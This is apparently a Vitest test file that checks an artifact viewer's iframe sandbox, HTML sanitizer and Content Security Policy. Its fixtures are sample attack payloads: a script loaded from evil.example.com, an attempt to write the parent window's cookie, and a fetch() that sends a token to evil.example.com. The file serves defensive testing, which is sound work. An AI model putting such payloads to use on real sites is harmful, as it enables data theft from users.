import { describe, it, expect } from 'vitest';
import { render, screen } from '@testing-library/react';
import { SandboxedIframe } from '../components/ArtifactViewer/SandboxedIframe';
import { sanitizeArtifactHtml } from '../utils/sanitize';

describe('Sandbox Security Defense Verification (ROADMAP §6)', () => {
  it('neutralizes external script exfiltration attempts', () => {
    const exploitPayload = `
      <!DOCTYPE html>
      <html>
      <head>
        <title>Malicious Exfiltration</title>
        <script src="https://evil.example.com/stealer.js"></script>
      </head>
      <body>
        <h1>Harmless Heading</h1>
      </body>
      </html>
    `;

    const sanitized = sanitizeArtifactHtml(exploitPayload);
    expect(sanitized).not.toContain('evil.example.com');
    expect(sanitized).not.toContain('<script src=');
  });

  it('guarantees parent DOM tampering is blocked by omitting allow-same-origin', () => {
    const parentCookieTheftPayload = `
      <!DOCTYPE html>
      <html>
      <body>
        <script>
          try {
            window.parent.document.cookie = 'stolen_cookie=123';
          } catch(e) {
            console.log('Blocked by browser sandbox');
          }
        </script>
      </body>
      </html>
    `;

    render(<SandboxedIframe content={parentCookieTheftPayload} title="Cookie Theft Test" />);

    const iframe = screen.getByTitle('Cookie Theft Test') as HTMLIFrameElement;
    const sandboxAttr = iframe.getAttribute('sandbox') || '';

    // Non-negotiable security invariant:
    // "allow-same-origin" MUST NOT be present in sandbox attribute
    expect(sandboxAttr.split(/\s+/)).not.toContain('allow-same-origin');
    expect(sandboxAttr.split(/\s+/)).toContain('allow-scripts');
  });

  it('enforces Content Security Policy blocking all external network requests', () => {
    const networkFetchPayload = `
      <!DOCTYPE html>
      <html>
      <body>
        <script>
          fetch('https://evil.example.com/data?token=secret');
        </script>
      </body>
      </html>
    `;

    render(<SandboxedIframe content={networkFetchPayload} title="Network Call Test" />);

    const iframe = screen.getByTitle('Network Call Test') as HTMLIFrameElement;
    const srcDoc = iframe.getAttribute('srcdoc') || '';

    // CSP directive 'default-src none' blocks fetch(), XMLHttpRequest, WebSocket, and Beacon API
    expect(srcDoc).toContain("default-src 'none'");
    // CSP only allows unsafe-inline for scripts and styles to support self-contained widgets
    expect(srcDoc).toContain("style-src 'unsafe-inline'");
    expect(srcDoc).toContain("script-src 'unsafe-inline'");
    expect(srcDoc).toContain("img-src data:");
  });
});
